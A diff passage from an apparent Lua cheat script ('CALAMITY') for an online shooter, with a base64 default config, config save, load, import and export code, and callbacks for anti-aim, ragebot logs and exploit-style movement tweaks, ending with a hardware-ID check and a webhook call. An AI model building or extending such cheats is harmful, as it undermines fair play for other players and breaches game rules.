+configs_db.cfg_list[1][2] = "W3sidmlzdWFscyI6eyJkZWZlbnNpdmVfd2luZG93X3R5cGUiOiJNb2Rlcm4iLCJjcm9zc19jb2xvciI6dHJ1ZSwiZGVmZW5zaXZlX3dpbmRvd19jIjoiI0ZGRkZGRkZGIiwicmFnZWJvdF9sb2dzIjpbIkNvbnNvbGUiLCJTY3JlZW4iLCJ+Il0sInJhZ2Vib3RfbG9nc19taXNzIjoiI0JENjM2MEZGIiwiY3Jvc3NfY29sb3JfYyI6IiM2NDY0NjRGRiIsInJhZ2Vib3RfbG9nc19oaXQiOiIjNzRCRDYwRkYiLCJjcm9zc19pbmQiOnRydWUsImNyb3NzX2luZF9jIjoiI0M4QzhDOEZGIiwia2V5X2NvbG9yIjp0cnVlLCJ2ZWxvY2l0eV93aW5kb3dfYyI6IiNGRkZGRkZGRiIsImtleV9jb2xvcl9jIjoiI0ZGRkZGRkZGIiwiY3Jvc3NfaW5kX3R5cGUiOiJBbHRlcm5hdGl2ZSIsImRlZmVuc2l2ZV93aW5kb3ciOnRydWUsInZlbG9jaXR5X3dpbmRvd190eXBlIjoiTW9kZXJuIiwidmVsb2NpdHlfd2luZG93Ijp0cnVlfSwibWlzYyI6eyJwcmVkaWN0IjpmYWxzZSwiZmFzdF9sYWRkZXIiOnRydWUsInVuc2FmZV9yZWNoYXJnZSI6dHJ1ZSwidW5zYWZlX3R5cGUiOiJBbHRlcm5hdGl2ZSIsImFzcGVjdHJhdGlvIjp0cnVlLCJhaXJxc2JpbmQiOlsxLDYsIn4iXSwiY29uc29sZSI6dHJ1ZSwiYXNwZWN0cmF0aW9fdmFsdWUiOjEzMywiZGVmZW5zaXZlX2ZpeCI6dHJ1ZSwiYWlycXMiOnRydWUsInRoaXJkX3BlcnNvbiI6dHJ1ZSwiYW50aWJhY2tzdGFiIjp0cnVlLCJ0aGlyZF9wZXJzb25fdmFsdWUiOjQ1fSwibWFpbiI6eyJ0YWIiOiLimaYgQ29uZmlnIOKZpiJ9LCJhbnRpYWltIjp7InRhYiI6Ik1haW4iLCJkZWZlbnNpdmVfY29uZGl0aW9uIjpbIn4iXSwieWF3X29wdGlvbnMiOlsifiJdLCJrZXlfbGVmdCI6WzEsOTAsIn4iXSwic2FmZV9oZWFkIjpbIkFpcitDIEtuaWZlIiwiQWlyK0MgWmV1cyIsIkhlaWdodCBEaWZmZXJlbmNlIiwifiJdLCJmcl9vcHRpb25zIjpbIkZyZWVzdGFuZGluZyBPbiBRdWljayBQZWVrIiwifiJdLCJmcl9kaXNhYmxlcnMiOlsifiJdLCJhYV9vdmVycmlkZSI6WyJPbiBXYXJtdXAiLCJObyBFbmVtaWVzIEFsaXZlIiwifiJdLCJ5YXdfYmFzZSI6IkF0IHRhcmdldHMiLCJlZGdlX3lhdyI6WzEsMCwifiJdLCJrZXlfZm9yd2FyZCI6WzEsMCwifiJdLCJtYW51YWxfZGlyZWN0aW9uIjpmYWxzZSwiaGVpZ2h0X2RpZmZlcmVuY2UiOjIwMCwiY29uZGl0aW9uIjoiV2Fsa2luZyIsInlhd19kaXJlY3Rpb24iOnRydWUsImRlZmVuc2l2ZV90cmlnZ2VycyI6WyJ+Il0sImZyZWVzdGFuZGluZyI6WzEsMCwifiJdLCJrZXlfcmlnaHQiOlsxLDY3LCJ+Il19LCJjb25maWciOnsibGlzdCI6MSwibmFtZSI6IiJ9fSxbeyJlbmFibGUiOmZhbHNlLCJkZWZfbW9kX3JhbmRvbSI6MCwibW9kX3R5cGUiOiJPZmYiLCJ5YXdfb2Zmc2V0IjowLCJwZWVrX2RlZiI6ZmFsc2UsImRlZmVuc2l2ZV9waXRjaCI6Ik9mZiIsImRlbGF5X3JhbmRvbSI6MSwiYm9keV9zbGlkZXIiOjAsImJvZHlfeWF3X3R5cGUiOiJPZmYiLCJ5YXdfcmFuZG9tIjowLCJkZWZfYm9keV9zbGlkZXIiOjAsImRlZmVuc2l2ZSI6ZmFsc2UsIm1vZF9kbSI6MCwiZGVmX21vZF9kbSI6MCwiZGVmZW5zaXZlX3NlbGVjdCI6WyJ+Il0sInlhd19yaWdodCI6MCwiZm9yY2VfZGVmIjpmYWxzZSwieWF3X2RlbGF5IjoxLCJkZWZfYm9keV95YXdfdHlwZSI6Ik9mZiIsImRlZmVuc2l2ZV95YXciOiJPZmYiLCJkZWZfbW9kX3R5cGUiOiJPZmYiLCJ5YXdfdmFsdWUiOjAsIm1vZF9yYW5kb20iOjAsInNwaW5fb2Zmc2V0IjozNjAsInNwaW5fc3BlZWQiOjEwLCJwaXRjaF9zcGVlZCI6MCwieWF3X292ZXJyaWRlIjpmYWxzZSwieWF3X2xlZnQiOjAsInBpdGNoX3ZhbHVlIjowLCJwaXRjaCI6IkRvd24ifSx7ImVuYWJsZSI6dHJ1ZSwiZGVmX21vZF9yYW5kb20iOjAsIm1vZF90eXBlIjoiU2tpdHRlciIsInlhd19vZmZzZXQiOjMsInBlZWtfZGVmIjpmYWxzZSwiZGVmZW5zaXZlX3BpdGNoIjoiT2ZmIiwiZGVsYXlfcmFuZG9tIjoxLCJib2R5X3NsaWRlciI6MSwiYm9keV95YXdfdHlwZSI6IkppdHRlciIsInlhd19yYW5kb20iOjAsImRlZl9ib2R5X3NsaWRlciI6MSwiZGVmZW5zaXZlIjp0cnVlLCJtb2RfZG0iOi0zMywiZGVmX21vZF9kbSI6LTUwLCJkZWZlbnNpdmVfc2VsZWN0IjpbIkppdHRlciIsIkJvZHkgWWF3IiwifiJdLCJ5YXdfcmlnaHQiOjAsImZvcmNlX2RlZiI6dHJ1ZSwieWF3X2RlbGF5IjoxLCJkZWZfYm9keV95YXdfdHlwZSI6IkppdHRlciIsImRlZmVuc2l2ZV95YXciOiJPZmZzZXQiLCJkZWZfbW9kX3R5cGUiOiJTa2l0dGVyIiwieWF3X3ZhbHVlIjozLCJtb2RfcmFuZG9tIjowLCJzcGluX29mZnNldCI6MzYwLCJzcGluX3NwZWVkIjoxMCwicGl0Y2hfc3BlZWQiOjEsInlhd19vdmVycmlkZSI6ZmFsc2UsInlhd19sZWZ0IjowLCJwaXRjaF92YWx1ZSI6ODksInBpdGNoIjoiRG93biJ9LHsiZW5hYmxlIjp0cnVlLCJkZWZfbW9kX3JhbmRvbSI6MCwibW9kX3R5cGUiOiJTa2l0dGVyIiwieWF3X29mZnNldCI6MywicGVla19kZWYiOmZhbHNlLCJkZWZlbnNpdmVfcGl0Y2giOiJPZmYiLCJkZWxheV9yYW5kb20iOjEsImJvZHlfc2xpZGVyIjoxLCJib2R5X3lhd190eXBlIjoiSml0dGVyIiwieWF3X3JhbmRvbSI6MCwiZGVmX2JvZHlfc2xpZGVyIjowLCJkZWZlbnNpdmUiOnRydWUsIm1vZF9kbSI6LTQwLCJkZWZfbW9kX2RtIjotNjUsImRlZmVuc2l2ZV9zZWxlY3QiOlsiSml0dGVyIiwifiJdLCJ5YXdfcmlnaHQiOjAsImZvcmNlX2RlZiI6dHJ1ZSwieWF3X2RlbGF5IjoxLCJkZWZfYm9keV95YXdfdHlwZSI6IkppdHRlciIsImRlZmVuc2l2ZV95YXciOiJPZmZzZXQiLCJkZWZfbW9kX3R5cGUiOiJTa2l0dGVyIiwieWF3X3ZhbHVlIjozLCJtb2RfcmFuZG9tIjowLCJzcGluX29mZnNldCI6MzYwLCJzcGluX3NwZWVkIjoxMCwicGl0Y2hfc3BlZWQiOjIsInlhd19vdmVycmlkZSI6ZmFsc2UsInlhd19sZWZ0IjowLCJwaXRjaF92YWx1ZSI6ODksInBpdGNoIjoiRG93biJ9LHsiZW5hYmxlIjp0cnVlLCJkZWZfbW9kX3JhbmRvbSI6MCwibW9kX3R5cGUiOiJTa2l0dGVyIiwieWF3X29mZnNldCI6MTksInBlZWtfZGVmIjpmYWxzZSwiZGVmZW5zaXZlX3BpdGNoIjoiT2ZmIiwiZGVsYXlfcmFuZG9tIjoxLCJib2R5X3NsaWRlciI6MSwiYm9keV95YXdfdHlwZSI6IkppdHRlciIsInlhd19yYW5kb20iOjAsImRlZl9ib2R5X3NsaWRlciI6MCwiZGVmZW5zaXZlIjp0cnVlLCJtb2RfZG0iOi0zNSwiZGVmX21vZF9kbSI6LTUwLCJkZWZlbnNpdmVfc2VsZWN0IjpbIkppdHRlciIsIn4iXSwieWF3X3JpZ2h0IjozLCJmb3JjZV9kZWYiOnRydWUsInlhd19kZWxheSI6MSwiZGVmX2JvZHlfeWF3X3R5cGUiOiJPZmYiLCJkZWZlbnNpdmVfeWF3IjoiT2Zmc2V0IiwiZGVmX21vZF90eXBlIjoiU2tpdHRlciIsInlhd192YWx1ZSI6MywibW9kX3JhbmRvbSI6MCwic3Bpbl9vZmZzZXQiOjM2MCwic3Bpbl9zcGVlZCI6MTAsInBpdGNoX3NwZWVkIjowLCJ5YXdfb3ZlcnJpZGUiOnRydWUsInlhd19sZWZ0IjozLCJwaXRjaF92YWx1ZSI6MCwicGl0Y2giOiJEb3duIn0seyJlbmFibGUiOnRydWUsImRlZl9tb2RfcmFuZG9tIjowLCJtb2RfdHlwZSI6IlNraXR0ZXIiLCJ5YXdfb2Zmc2V0IjoxNywicGVla19kZWYiOmZhbHNlLCJkZWZlbnNpdmVfcGl0Y2giOiJPZmYiLCJkZWxheV9yYW5kb20iOjEsImJvZHlfc2xpZGVyIjoxLCJib2R5X3lhd190eXBlIjoiSml0dGVyIiwieWF3X3JhbmRvbSI6MCwiZGVmX2JvZHlfc2xpZGVyIjoxLCJkZWZlbnNpdmUiOnRydWUsIm1vZF9kbSI6LTMzLCJkZWZfbW9kX2RtIjotNTEsImRlZmVuc2l2ZV9zZWxlY3QiOlsiSml0dGVyIiwiQm9keSBZYXciLCJ+Il0sInlhd19yaWdodCI6MywiZm9yY2VfZGVmIjp0cnVlLCJ5YXdfZGVsYXkiOjEsImRlZl9ib2R5X3lhd190eXBlIjoiSml0dGVyIiwiZGVmZW5zaXZlX3lhdyI6Ik9mZnNldCIsImRlZl9tb2RfdHlwZSI6IlNraXR0ZXIiLCJ5YXdfdmFsdWUiOjMsIm1vZF9yYW5kb20iOjAsInNwaW5fb2Zmc2V0IjozNjAsInNwaW5fc3BlZWQiOjEwLCJwaXRjaF9zcGVlZCI6LTEsInlhd19vdmVycmlkZSI6dHJ1ZSwieWF3X2xlZnQiOjMsInBpdGNoX3ZhbHVlIjo4OSwicGl0Y2giOiJEb3duIn0seyJlbmFibGUiOnRydWUsImRlZl9tb2RfcmFuZG9tIjowLCJtb2RfdHlwZSI6IlNraXR0ZXIiLCJ5YXdfb2Zmc2V0IjoxNiwicGVla19kZWYiOmZhbHNlLCJkZWZlbnNpdmVfcGl0Y2giOiJPZmYiLCJkZWxheV9yYW5kb20iOjEsImJvZHlfc2xpZGVyIjoxLCJib2R5X3lhd190eXBlIjoiSml0dGVyIiwieWF3X3JhbmRvbSI6MCwiZGVmX2JvZHlfc2xpZGVyIjoxLCJkZWZlbnNpdmUiOnRydWUsIm1vZF9kbSI6LTMzLCJkZWZfbW9kX2RtIjotNTEsImRlZmVuc2l2ZV9zZWxlY3QiOlsiSml0dGVyIiwiQm9keSBZYXciLCJ+Il0sInlhd19yaWdodCI6MTAsImZvcmNlX2RlZiI6dHJ1ZSwieWF3X2RlbGF5IjoxLCJkZWZfYm9keV95YXdfdHlwZSI6IkppdHRlciIsImRlZmVuc2l2ZV95YXciOiJPZmZzZXQiLCJkZWZfbW9kX3R5cGUiOiJTa2l0dGVyIiwieWF3X3ZhbHVlIjoxMCwibW9kX3JhbmRvbSI6MCwic3Bpbl9vZmZzZXQiOjM2MCwic3Bpbl9zcGVlZCI6MTAsInBpdGNoX3NwZWVkIjowLCJ5YXdfb3ZlcnJpZGUiOnRydWUsInlhd19sZWZ0IjoxMCwicGl0Y2hfdmFsdWUiOjAsInBpdGNoIjoiRG93biJ9LHsiZW5hYmxlIjp0cnVlLCJkZWZfbW9kX3JhbmRvbSI6MTAsIm1vZF90eXBlIjoiQ2VudGVyIiwieWF3X29mZnNldCI6NiwicGVla19kZWYiOmZhbHNlLCJkZWZlbnNpdmVfcGl0Y2giOiJDdXN0b20iLCJkZWxheV9yYW5kb20iOjEsImJvZHlfc2xpZGVyIjoxLCJib2R5X3lhd190eXBlIjoiSml0dGVyIiwieWF3X3JhbmRvbSI6MTIsImRlZl9ib2R5X3NsaWRlciI6MSwiZGVmZW5zaXZlIjp0cnVlLCJtb2RfZG0iOjU1LCJkZWZfbW9kX2RtIjowLCJkZWZlbnNpdmVfc2VsZWN0IjpbIkppdHRlciIsIkJvZHkgWWF3IiwifiJdLCJ5YXdfcmlnaHQiOjcsImZvcmNlX2RlZiI6dHJ1ZSwieWF3X2RlbGF5IjoxLCJkZWZfYm9keV95YXdfdHlwZSI6IlN0YXRpYyIsImRlZmVuc2l2ZV95YXciOiJTcGluIiwiZGVmX21vZF90eXBlIjoiT2ZmIiwieWF3X3ZhbHVlIjoxODAsIm1vZF9yYW5kb20iOjEwLCJzcGluX29mZnNldCI6MzYwLCJzcGluX3NwZWVkIjo5LCJwaXRjaF9zcGVlZCI6MCwieWF3X292ZXJyaWRlIjpmYWxzZSwieWF3X2xlZnQiOjcsInBpdGNoX3ZhbHVlIjotODksInBpdGNoIjoiRG93biJ9LHsiZW5hYmxlIjp0cnVlLCJkZWZfbW9kX3JhbmRvbSI6MTAsIm1vZF90eXBlIjoiQ2VudGVyIiwieWF3X29mZnNldCI6NiwicGVla19kZWYiOmZhbHNlLCJkZWZlbnNpdmVfcGl0Y2giOiJDdXN0b20iLCJkZWxheV9yYW5kb20iOjEsImJvZHlfc2xpZGVyIjoxLCJib2R5X3lhd190eXBlIjoiSml0dGVyIiwieWF3X3JhbmRvbSI6MTMsImRlZl9ib2R5X3NsaWRlciI6LTEsImRlZmVuc2l2ZSI6dHJ1ZSwibW9kX2RtIjo1MCwiZGVmX21vZF9kbSI6MCwiZGVmZW5zaXZlX3NlbGVjdCI6WyJKaXR0ZXIiLCJCb2R5IFlhdyIsIn4iXSwieWF3X3JpZ2h0IjoyMiwiZm9yY2VfZGVmIjp0cnVlLCJ5YXdfZGVsYXkiOjEsImRlZl9ib2R5X3lhd190eXBlIjoiU3RhdGljIiwiZGVmZW5zaXZlX3lhdyI6IlNwaW4iLCJkZWZfbW9kX3R5cGUiOiJPZmYiLCJ5YXdfdmFsdWUiOjE4MCwibW9kX3JhbmRvbSI6MTAsInNwaW5fb2Zmc2V0IjozNjAsInNwaW5fc3BlZWQiOjUsInBpdGNoX3NwZWVkIjowLCJ5YXdfb3ZlcnJpZGUiOmZhbHNlLCJ5YXdfbGVmdCI6MCwicGl0Y2hfdmFsdWUiOi04OSwicGl0Y2giOiJEb3duIn0seyJlbmFibGUiOmZhbHNlLCJkZWZfbW9kX3JhbmRvbSI6MCwibW9kX3R5cGUiOiJPZmYiLCJ5YXdfb2Zmc2V0IjowLCJwZWVrX2RlZiI6ZmFsc2UsImRlZmVuc2l2ZV9waXRjaCI6Ik9mZiIsImRlbGF5X3JhbmRvbSI6MSwiYm9keV9zbGlkZXIiOjAsImJvZHlfeWF3X3R5cGUiOiJPZmYiLCJ5YXdfcmFuZG9tIjowLCJkZWZfYm9keV9zbGlkZXIiOjAsImRlZmVuc2l2ZSI6ZmFsc2UsIm1vZF9kbSI6MCwiZGVmX21vZF9kbSI6MCwiZGVmZW5zaXZlX3NlbGVjdCI6WyJ+Il0sInlhd19yaWdodCI6MCwiZm9yY2VfZGVmIjpmYWxzZSwieWF3X2RlbGF5IjoxLCJkZWZfYm9keV95YXdfdHlwZSI6Ik9mZiIsImRlZmVuc2l2ZV95YXciOiJPZmYiLCJkZWZfbW9kX3R5cGUiOiJPZmYiLCJ5YXdfdmFsdWUiOjAsIm1vZF9yYW5kb20iOjAsInNwaW5fb2Zmc2V0IjozNjAsInNwaW5fc3BlZWQiOjEwLCJwaXRjaF9zcGVlZCI6MCwieWF3X292ZXJyaWRlIjpmYWxzZSwieWF3X2xlZnQiOjAsInBpdGNoX3ZhbHVlIjowLCJwaXRjaCI6Ik9mZiJ9LHsiZW5hYmxlIjp0cnVlLCJkZWZfbW9kX3JhbmRvbSI6MCwibW9kX3R5cGUiOiJPZmYiLCJ5YXdfb2Zmc2V0IjoxODAsInBlZWtfZGVmIjpmYWxzZSwiZGVmZW5zaXZlX3BpdGNoIjoiT2ZmIiwiZGVsYXlfcmFuZG9tIjoxLCJib2R5X3NsaWRlciI6MCwiYm9keV95YXdfdHlwZSI6IkppdHRlciIsInlhd19yYW5kb20iOjAsImRlZl9ib2R5X3NsaWRlciI6MCwiZGVmZW5zaXZlIjpmYWxzZSwibW9kX2RtIjoxMDYsImRlZl9tb2RfZG0iOjAsImRlZmVuc2l2ZV9zZWxlY3QiOlsifiJdLCJ5YXdfcmlnaHQiOjAsImZvcmNlX2RlZiI6dHJ1ZSwieWF3X2RlbGF5IjoxLCJkZWZfYm9keV95YXdfdHlwZSI6Ik9mZiIsImRlZmVuc2l2ZV95YXciOiJPZmYiLCJkZWZfbW9kX3R5cGUiOiJPZmYiLCJ5YXdfdmFsdWUiOjAsIm1vZF9yYW5kb20iOjAsInNwaW5fb2Zmc2V0IjozNjAsInNwaW5fc3BlZWQiOjEwLCJwaXRjaF9zcGVlZCI6MCwieWF3X292ZXJyaWRlIjpmYWxzZSwieWF3X2xlZnQiOjAsInBpdGNoX3ZhbHVlIjowLCJwaXRjaCI6Ik9mZiJ9LHsiZW5hYmxlIjp0cnVlLCJkZWZfbW9kX3JhbmRvbSI6MCwibW9kX3R5cGUiOiJPZmYiLCJ5YXdfb2Zmc2V0Ijo1LCJwZWVrX2RlZiI6ZmFsc2UsImRlZmVuc2l2ZV9waXRjaCI6IkN1c3RvbSIsImRlbGF5X3JhbmRvbSI6MSwiYm9keV9zbGlkZXIiOjEsImJvZHlfeWF3X3R5cGUiOiJTdGF0aWMiLCJ5YXdfcmFuZG9tIjowLCJkZWZfYm9keV9zbGlkZXIiOi0xLCJkZWZlbnNpdmUiOnRydWUsIm1vZF9kbSI6MCwiZGVmX21vZF9kbSI6MCwiZGVmZW5zaXZlX3NlbGVjdCI6WyJCb2R5IFlhdyIsIn4iXSwieWF3X3JpZ2h0IjowLCJmb3JjZV9kZWYiOnRydWUsInlhd19kZWxheSI6MSwiZGVmX2JvZHlfeWF3X3R5cGUiOiJTdGF0aWMiLCJkZWZlbnNpdmVfeWF3IjoiT2ZmIiwiZGVmX21vZF90eXBlIjoiT2ZmIiwieWF3X3ZhbHVlIjowLCJtb2RfcmFuZG9tIjowLCJzcGluX29mZnNldCI6MzYwLCJzcGluX3NwZWVkIjoxMCwicGl0Y2hfc3BlZWQiOjAsInlhd19vdmVycmlkZSI6ZmFsc2UsInlhd19sZWZ0IjowLCJwaXRjaF92YWx1ZSI6LTg5LCJwaXRjaCI6IkRvd24ifSx7ImVuYWJsZSI6dHJ1ZSwiZGVmX21vZF9yYW5kb20iOjAsIm1vZF90eXBlIjoiT2ZmIiwieWF3X29mZnNldCI6MjUsInBlZWtfZGVmIjpmYWxzZSwiZGVmZW5zaXZlX3BpdGNoIjoiQ3VzdG9tIiwiZGVsYXlfcmFuZG9tIjoxLCJib2R5X3NsaWRlciI6MSwiYm9keV95YXdfdHlwZSI6IlN0YXRpYyIsInlhd19yYW5kb20iOjAsImRlZl9ib2R5X3NsaWRlciI6MCwiZGVmZW5zaXZlIjp0cnVlLCJtb2RfZG0iOjAsImRlZl9tb2RfZG0iOjAsImRlZmVuc2l2ZV9zZWxlY3QiOlsifiJdLCJ5YXdfcmlnaHQiOjAsImZvcmNlX2RlZiI6dHJ1ZSwieWF3X2RlbGF5IjoxLCJkZWZfYm9keV95YXdfdHlwZSI6Ik9mZiIsImRlZmVuc2l2ZV95YXciOiJPZmZzZXQiLCJkZWZfbW9kX3R5cGUiOiJPZmYiLCJ5YXdfdmFsdWUiOjE4MCwibW9kX3JhbmRvbSI6MCwic3Bpbl9vZmZzZXQiOjM2MCwic3Bpbl9zcGVlZCI6MTAsInBpdGNoX3NwZWVkIjowLCJ5YXdfb3ZlcnJpZGUiOmZhbHNlLCJ5YXdfbGVmdCI6MCwicGl0Y2hfdmFsdWUiOjAsInBpdGNoIjoiRG93biJ9XV0="
+
+cfg_system.save_config = function(id)
+    if id == 1 then return end
+    if configs_db.cfg_list[id] == nil then
+        print("Error: config with id "..id.." does not exist.")
+        return
+    end
+
+    if configs_db.cfg_list[id][2] == nil then
+        print("Error: second part of config with id "..id.." does not exist.")
+        return
+    end
+    
+    local raw = package:save()
+    configs_db.cfg_list[id][2] = base64.encode(json.stringify(raw))
+    database.write(lua_db.configs, configs_db)
+end
+
+
+cfg_system.update_values = function(id)
+    local name = configs_db.cfg_list[id][1]
+    local new_name = name..'\v - Active'
+    for k, v in ipairs(configs_db.cfg_list) do
+        configs_db.menu_list[k] = v[1]
+    end
+    configs_db.menu_list[id] = new_name
+end
+
+cfg_system.create_config = function(name)
+    if type(name) ~= 'string' then return end
+
+    if name == nil or name == '' or name == ' ' then
+        print('Wrong Name')
+        return
+    end
+
+    for i= #configs_db.menu_list, 1, -1 do
+        if configs_db.menu_list[i] == name then
+            print('Another config has the same name')
+            return
+        end
+    end
+
+    if #configs_db.cfg_list > 9 then
+        print('Maximum number of configs: 10')
+        return
+    end
+
+    local completed = {name, ''}
+    table.insert(configs_db.cfg_list, completed)
+    table.insert(configs_db.menu_list, name)
+    database.write(lua_db.configs, configs_db)
+end
+
+cfg_system.remove_config = function(id)
+    if id == 1 then return end
+    local item = configs_db.cfg_list[id][1]
+
+    for i= #configs_db.cfg_list, 1, -1 do
+        if configs_db.cfg_list[i][1] == item then
+            table.remove(configs_db.cfg_list, i)
+            table.remove(configs_db.menu_list, i)
+        end
+    end
+
+    database.write(lua_db.configs, configs_db)
+end
+
+cfg_system.load_config = function(id)
+    if configs_db.cfg_list[id][2] == nil or configs_db.cfg_list[id][2] == '' then
+        print("Problem with: "..id.." Config")
+        return
+    end
+
+    if id > #configs_db.cfg_list then
+        print("Problem with: "..id.." Config")
+        return
+    end
+
+    package:load(json.parse(base64.decode(configs_db.cfg_list[id][2])))
+end
+
+lua_menu.config.create:set_callback(function() 
+    cfg_system.create_config(lua_menu.config.name:get())
+    lua_menu.config.list:update(configs_db.menu_list)
+end)
+
+lua_menu.config.load:set_callback(function() 
+    cfg_system.update_values(lua_menu.config.list:get() + 1)
+    cfg_system.load_config(lua_menu.config.list:get() + 1)
+    lua_menu.config.list:update(configs_db.menu_list)
+end)
+
+lua_menu.config.save:set_callback(function() 
+    cfg_system.save_config(lua_menu.config.list:get() + 1)
+end)
+
+lua_menu.config.delete:set_callback(function() 
+    cfg_system.remove_config(lua_menu.config.list:get() + 1)
+    lua_menu.config.list:update(configs_db.menu_list)
+end)
+
+lua_menu.config.import:set_callback(function() 
+    package:load(json.parse(base64.decode(clipboard.get())))
+end)
+
+lua_menu.config.export:set_callback(function() 
+    clipboard.set(base64.encode(json.stringify(package:save())))
+end)
+lua_menu.config.list:update(configs_db.menu_list)
+
+client.set_event_callback("setup_command", function(cmd)
+    aa_setup(cmd)
+    if lua_menu.misc.airqsbind:get() and lua_menu.misc.airqs:get() then
+        air_qs(cmd)
+    end
+
+    if lua_menu.misc.defensive_fix:get() then
+        defensive_fix(cmd)
+    end
+
+    if lua_menu.misc.unsafe_recharge:get() then
+        unsafe_charge(cmd)
+    end
+
+    if lua_menu.misc.fast_ladder:get() then
+        fastladder(cmd)
+    end
+end)
+
+client.set_event_callback('paint', function()
+    if not entity.is_alive(entity.get_local_player()) then return end
+    if lua_menu.visuals.cross_ind:get() then
+        screen_indicator()
+    end
+
+    ragebot_logs()
+
+    text_fade_animation(25, center[2] - 20, -1, {r=200, g=200, b=200, a=255}, {r=150, g=150, b=150, a=255}, "C A L A M I T Y", "")
+    renderer.text(25 + renderer.measure_text('', 'C A L A M I T Y '), center[2] - 20, 200, 200, 200, 255, '', 0, '\aB94A4AFF[BETA]')
+
+    thirdperson(lua_menu.misc.third_person:get() and lua_menu.misc.third_person_value:get() or nil)
+    aspectratio(lua_menu.misc.aspectratio:get() and lua_menu.misc.aspectratio_value:get()/100 or nil)
+    if lua_menu.visuals.velocity_window:get() then
+        velocity_ind()
+    end
+    if lua_menu.visuals.defensive_window:get() then
+        defensive_ind()
+    end
+
+    if lua_menu.misc.airqsbind:get() and lua_menu.misc.airqs:get() then
+        renderer.indicator(255, 255, 255, 255, 'QS')
+    end
+end)
+
+client.set_event_callback('shutdown', function()
+    thirdperson(150)
+    aspectratio(0)
+    hide_original_menu(true)
+    database.write(lua_db.configs, configs_db)
+    lol_predict(false)
+end)
+
+client.set_event_callback('paint_ui', function()
+    hide_original_menu(false)
+end)
+
+
+client.set_event_callback("level_init", function()
+    console_filter(lua_menu.misc.console:get())
+    alive_players = {}
+    logs = {}
+    breaker.cmd = 0
+    breaker.defensive = 0
+    breaker.defensive_check = 0
+end)
+
+client.set_event_callback("round_start", function()
+    console_filter(lua_menu.misc.console:get())
+    alive_players = {}
+    logs = {}
+    breaker.cmd = 0
+    breaker.defensive = 0
+    breaker.defensive_check = 0
+end)
+client.log("Hwid success")
+end)
+end
+}
+
+webhook.Run()
+local bit = require'bit'
